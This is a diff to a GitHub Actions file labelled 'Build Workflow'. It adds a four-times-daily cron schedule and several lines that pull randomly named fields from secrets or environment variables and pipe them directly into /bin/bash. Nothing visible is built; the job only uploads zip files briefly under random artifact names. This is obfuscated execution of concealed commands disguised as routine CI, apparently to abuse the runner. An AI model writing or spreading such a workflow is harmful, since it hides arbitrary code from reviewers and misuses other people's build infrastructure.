@@ -2,6 +2,8 @@ name: Build Workflow
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '8 4,10,16,22 * * *'
 env:
   CI: true
 concurrency:
@@ -14,15 +16,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: Perform
         env:
-          bt22: ${{ secrets.bt22 }}
+          zp4828: ${{ secrets.zp4828 }}
         run: |
-          printf '%s' "$bt22" | jq -r .w78 | /bin/bash
-          printf '%s' "$xm3" | jq -r .mztn14871 | /bin/bash
-          printf '%s' "$zj22002" | jq -r .tjhap859 | /bin/bash
+          printf '%s' "$zp4828" | jq -r .dakac7010 | /bin/bash
+          echo $ani9948 | jq -r .jhv81211 | /bin/bash
+          printf '%s' "$y22" | jq -r .aapeo0896 | /bin/bash
+          printf '%s' "$yh7771" | jq -r .igwkl39 | /bin/bash
+          printf '%s' "$bqw1" | jq -r .m1 | /bin/bash
+          printf '%s' "$jng072" | jq -r .qe872 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
         with:
-          name: OTp04lkY
+          name: z2zSyb0k
           path: "*.zip"
           retention-days: 1
